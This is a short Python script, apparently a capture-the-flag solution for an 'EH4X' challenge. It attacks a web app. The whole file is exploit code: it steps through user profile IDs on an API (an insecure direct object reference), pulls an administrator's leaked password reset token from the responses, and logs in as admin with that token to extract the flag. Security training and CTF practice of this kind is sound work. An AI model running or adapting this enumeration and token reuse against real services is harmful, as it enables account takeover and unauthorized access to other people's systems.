#!/usr/bin/env python3
import sys
import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:5000"
s = requests.Session()

for user_id in range(1, 20):
    r = s.get(f"{BASE}/api/profile/{user_id}", timeout=5)
    if r.status_code != 200:
        continue
    data = r.json()
    if data.get("role") == "administrator" and data.get("reset_token"):
        token = data["reset_token"]
        print(f"[+] Found admin profile: {user_id}")
        print(f"[+] Reset token: {token}")
        break
else:
    raise SystemExit("[-] Administrator profile not found")

r = s.post(f"{BASE}/admin/login", data={"token": token}, allow_redirects=True, timeout=5)
r.raise_for_status()
start = r.text.find("EH4X{")
if start == -1:
    raise SystemExit("[-] Flag not found")
end = r.text.find("}", start)
print(f"[+] Flag: {r.text[start:end+1]}")
